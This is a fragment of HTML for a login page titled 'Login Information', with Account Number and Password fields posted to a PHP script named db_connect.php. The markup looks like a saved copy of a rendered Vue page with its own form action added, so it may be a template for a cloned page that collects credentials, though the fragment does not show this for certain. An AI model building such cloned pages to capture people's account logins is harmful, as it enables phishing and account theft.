            ...
            <div class="container container--fluid">
                <div data-v-0e68e607="" id="content">
                    <div data-v-63c8da32="" data-v-0e68e607="">
                        <h1 data-v-63c8da32="" class="text-h4">Login Information</h1>
                        <div data-v-2906dda8="" data-v-63c8da32="" class="row">
                            <div data-v-2906dda8="" class="col-md-5 col-lg-4 col">
                                <form data-v-63c8da32="" novalidate="novalidate" class="v-form" data-v-2906dda8="" action="db_connect.php" method="post">
                                <div data-v-6a6d1b4c="" data-v-55886b46="">
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                        ...
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot">
                                                                    <input autocomplete="off" placeholder="Account Number" id="ai" type="text" name="account" value="">
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div data-v-021e61f0="" class="v-input theme--light v-text-field v-text-field--is-booted">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot">
                                                                <input autocomplete="off" placeholder="Password" id="pr" type="password" name="password" value=""></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            ...
                                            <div data-v-63c8da32="" class="mt-4"><button data-v-63c8da32="" type="submit" class="mr-3 v-btn v-btn--is-elevated v-btn--has-bg theme--light v-size--default primary"><span class="v-btn__content">Login</span></button>
